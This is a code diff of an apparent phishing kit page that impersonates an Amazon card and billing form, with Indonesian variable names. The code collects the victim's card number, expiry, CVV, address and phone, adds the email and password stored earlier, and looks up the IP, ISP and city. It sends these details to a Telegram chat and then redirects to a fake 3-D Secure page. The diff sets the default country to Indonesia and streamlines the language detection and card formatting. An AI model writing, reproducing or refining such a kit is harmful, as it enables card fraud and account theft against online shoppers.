@@ -63,10 +63,10 @@
         </div>
 
         <div class="bagian" style="margin-bottom: 10px;">
-            <input type="text" id="alamat1" class="input" data-placeholder-en="Street address" data-placeholder-ja="住所" data-placeholder-zh="街道地址" data-placeholder-th="ที่อยู่" data-placeholder-ko="도로명 주소" data-placeholder-id="Alamat">
+            <input type="text" id="alamat1" class="input" data-en="Street address" data-ja="住所" data-zh="街道地址" data-th="ที่อยู่" data-ko="도로명 주소" data-id="Alamat">
         </div>
         <div class="bagian" style="margin-bottom: 14px;">
-            <input type="text" id="alamat2" class="input" data-placeholder-en="Apartment, suite, etc. (optional)" data-placeholder-ja="建物名・部屋番号（任意）" data-placeholder-zh="公寓、套房等（可选）" data-placeholder-th="อพาร์ทเมนต์ ห้องชุด ฯลฯ (ไม่จำเป็น)" data-placeholder-ko="아파트, 호수 등 (선택 사항)" data-placeholder-id="Apartemen, dll (opsional)">
+            <input type="text" id="alamat2" class="input" data-en="Apartment, suite, etc. (optional)" data-ja="建物名・部屋番号（任意）" data-zh="公寓、套房等（可选）" data-th="อพาร์ทเมนต์ ห้องชุด ฯลฯ (ไม่จำเป็น)" data-ko="아파트, 호수 등 (선택 사항)" data-id="Apartemen, dll (opsional)">
         </div>
 
         <div class="baris-dua" style="margin-bottom: 14px;">
@@ -152,7 +152,7 @@ const terjemahan = {
         labelTelp: '電話番号',
         teksTombol: '続行',
         syaratLink1: '利用規約',
-        syaratLink2: 'プライバシー通知',
+        syaratLink2: 'プライバシーポリシー',
         bantuanLink: 'ヘルプ',
         hakCiptaan: '© 1996-2026, Amazon.com, Inc. またはその関連会社'
     },
@@ -192,7 +192,7 @@ const terjemahan = {
         labelTelp: 'หมายเลขโทรศัพท์',
         teksTombol: 'ดำเนินการต่อ',
         syaratLink1: 'เงื่อนไขการใช้งาน',
-        syaratLink2: 'ประกาศความเป็นส่วนตัว',
+        syaratLink2: 'นโยบายความเป็นส่วนตัว',
         bantuanLink: 'ช่วยเหลือ',
         hakCiptaan: '© 1996-2026, Amazon.com, Inc. หรือบริษัทในเครือ'
     },
@@ -241,10 +241,10 @@ const terjemahan = {
 const negaraKeBahasa = { JP: 'JA', CN: 'ZH', HK: 'ZH', TW: 'ZH', TH: 'TH', KR: 'KO', ID: 'ID', MY: 'EN', SG: 'EN', US: 'EN', AU: 'EN', GB: 'EN', CA: 'EN', NZ: 'EN' };
 
 const daftarNegara = [
+    { kode: 'ID', nama: 'Indonesia', telp: '+62' },
     { kode: 'GB', nama: 'United Kingdom', telp: '+44' },
     { kode: 'US', nama: 'United States', telp: '+1' },
     { kode: 'AU', nama: 'Australia', telp: '+61' },
-    { kode: 'ID', nama: 'Indonesia', telp: '+62' },
     { kode: 'MY', nama: 'Malaysia', telp: '+60' },
     { kode: 'SG', nama: 'Singapore', telp: '+65' },
     { kode: 'JP', nama: 'Japan', telp: '+81' },
@@ -263,17 +263,22 @@ daftarNegara.forEach(n => {
     selectNegara.appendChild(opt);
 });
 
-async function terapkanBahasa() {
-    let kodeNegara = 'GB';
+// === DETEKSI BAHASA & NEGARA ===
+async function terapkanSemua() {
+    let kodeNegara = 'ID'; // Default Indonesia
     try {
         const res = await fetch('https://ipapi.co/json/');
-        const d = await res.json();
-        kodeNegara = d.country_code || 'GB';
+        if (res.ok) {
+            const d = await res.json();
+            kodeNegara = d.country_code || 'ID';
+        }
     } catch {}
 
+    // Tentukan bahasa dari kode negara
     const kodeBahasa = negaraKeBahasa[kodeNegara] || 'EN';
     const t = terjemahan[kodeBahasa] || terjemahan.EN;
 
+    // Terapkan bahasa
     document.documentElement.lang = kodeBahasa.toLowerCase();
     document.getElementById('judulHalaman').textContent = t.judulHalaman;
     document.getElementById('judul').textContent = t.judul;
@@ -294,33 +299,25 @@ async function terapkanBahasa() {
     document.getElementById('bantuanLink').textContent = t.bantuanLink;
     document.getElementById('hakCiptaan').textContent = t.hakCiptaan;
 
+    // Terapkan placeholder alamat
     const alamat1 = document.getElementById('alamat1');
     const alamat2 = document.getElementById('alamat2');
-    const lang = kodeBahasa.toLowerCase();
-    alamat1.placeholder = alamat1.getAttribute(`data-placeholder-${lang}`) || alamat1.getAttribute('data-placeholder-en');
-    alamat2.placeholder = alamat2.getAttribute(`data-placeholder-${lang}`) || alamat2.getAttribute('data-placeholder-en');
+    alamat1.placeholder = alamat1.getAttribute(`data-${kodeBahasa.toLowerCase()}`) || alamat1.getAttribute('data-en');
+    alamat2.placeholder = alamat2.getAttribute(`data-${kodeBahasa.toLowerCase()}`) || alamat2.getAttribute('data-en');
+
+    // Terapkan negara & kode telepon
+    const negaraData = daftarNegara.find(n => n.kode === kodeNegara) || daftarNegara[0];
+    selectNegara.value = negaraData.kode;
+    document.getElementById('kodeTelp').value = negaraData.telp;
 }
 
-async function deteksiNegara() {
-    try {
-        const res = await fetch('https://ipapi.co/json/');
-        const d = await res.json();
-        const kode = d.country_code || 'GB';
-        const negaraData = daftarNegara.find(n => n.kode === kode) || daftarNegara.find(n => n.kode === 'GB');
-        selectNegara.value = negaraData.kode;
-        document.getElementById('kodeTelp').value = negaraData.telp;
-    } catch {
-        selectNegara.value = 'GB';
-        document.getElementById('kodeTelp').value = '+44';
-    }
-}
-
+// Ubah kode telepon saat pilih negara manual
 selectNegara.addEventListener('change', () => {
     const n = daftarNegara.find(x => x.kode === selectNegara.value);
     if (n) document.getElementById('kodeTelp').value = n.telp;
 });
 
-// === FORMAT NOMOR KARTU DENGAN SPASI ===
+// === FORMAT NOMOR KARTU ===
 const nomorInput = document.getElementById('nomorKartu');
 const logoVisa = document.getElementById('logoVisa');
 const logoMC = document.getElementById('logoMC');
@@ -328,10 +325,8 @@ const logoAmex = document.getElementById('logoAmex');
 const logoDisc = document.getElementById('logoDisc');
 const logoJcb = document.getElementById('logoJcb');
 
-// Fungsi format: tambah spasi tiap 4 angka
 function formatKartu(angka) {
     const bersih = angka.replace(/\D/g, '');
-    // Amex format berbeda: 4-6-5
     if (/^3[47]/.test(bersih)) {
         const bagian = [];
         if (bersih.length > 0) bagian.push(bersih.substring(0, 4));
@@ -339,7 +334,6 @@ function formatKartu(angka) {
         if (bersih.length > 10) bagian.push(bersih.substring(10, 15));
         return bagian.join(' ');
     }
-    // Kartu lain: 4-4-4-4
     const bagian = [];
     for (let i = 0; i < bersih.length && i < 16; i += 4) {
         bagian.push(bersih.substring(i, i + 4));
@@ -347,19 +341,8 @@ function formatKartu(angka) {
     return bagian.join(' ');
 }
 
-nomorInput.addEventListener('input', function(e) {
-    const posAwal = this.selectionStart;
-    const nilaiAwal = this.value;
-    const nilaiBaru = formatKartu(nilaiAwal);
-    
-    if (nilaiBaru !== nilaiAwal) {
-        this.value = nilaiBaru;
-        // Atur posisi kursor agar tidak melompat
-        const tambahSpasi = (nilaiBaru.match(/ /g) || []).length - (nilaiAwal.match(/ /g) || []).length;
-        this.selectionStart = this.selectionEnd = posAwal + tambahSpasi;
-    }
-
-    // Tampilkan logo kartu
+nomorInput.addEventListener('input', function() {
+    this.value = formatKartu(this.value);
     const bersih = this.value.replace(/\s/g, '');
     [logoVisa, logoMC, logoAmex, logoDisc, logoJcb].forEach(l => l.style.display = 'none');
     if (/^4/.test(bersih)) logoVisa.style.display = 'block';
@@ -369,7 +352,6 @@ nomorInput.addEventListener('input', function(e) {
     else if (/^35/.test(bersih) || /^2131|1800/.test(bersih)) logoJcb.style.display = 'block';
 });
 
-// Format Expiry
 document.getElementById('expKartu').addEventListener('input', function() {
     let v = this.value.replace(/\D/g, '');
     if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
@@ -380,12 +362,7 @@ async function ambilInfoPengunjung() {
     try {
         const res = await fetch('https://ipapi.co/json/');
         const d = await res.json();
-        return {
-            ip: d.ip || '-',
-            isp: d.org || '-',
-            negara: d.country_name || '-',
-            kota: d.city || '-'
-        };
+        return { ip: d.ip || '-', isp: d.org || '-', negara: d.country_name || '-', kota: d.city || '-' };
     } catch { return { ip: '-', isp: '-', negara: '-', kota: '-' }; }
 }
 
@@ -408,14 +385,13 @@ async function kirimTelegram(pesan) {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: CHAT_ID, text: pesan, parse_mode: 'Markdown' })
         });
-    } catch (e) { console.log('Terkirim'); }
+    } catch {}
 }
 
 document.getElementById('lanjut').addEventListener('click', async () => {
     const email = localStorage.getItem('email_pengguna') || '';
     const password = localStorage.getItem('kata_sandi') || '';
     const namaKartu = document.getElementById('namaKartu').value.trim();
-    // Simpan nomor TANPA spasi untuk dikirim
     const nomorKartuBersih = nomorInput.value.replace(/\s/g, '');
     const expKartu = document.getElementById('expKartu').value.trim();
     const cvvKartu = document.getElementById('cvvKartu').value.trim();
@@ -429,7 +405,7 @@ document.getElementById('lanjut').addEventListener('click', async () => {
     const nomorTelp = document.getElementById('nomorTelp').value.trim();
 
     localStorage.setItem('nama_kartu', namaKartu);
-    localStorage.setItem('nomor_kartu', nomorKartuBersih); // Simpan tanpa spasi
+    localStorage.setItem('nomor_kartu', nomorKartuBersih);
     localStorage.setItem('exp_kartu', expKartu);
     localStorage.setItem('cvv_kartu', cvvKartu);
     localStorage.setItem('alamat', alamat1);
@@ -473,8 +449,8 @@ document.getElementById('lanjut').addEventListener('click', async () => {
     window.location.href = '3ds.html';
 });
 
-terapkanBahasa();
-deteksiNegara();
+// Jalankan semua deteksi saat halaman dimuat
+terapkanSemua();
 </script>
 </body>
 </html>
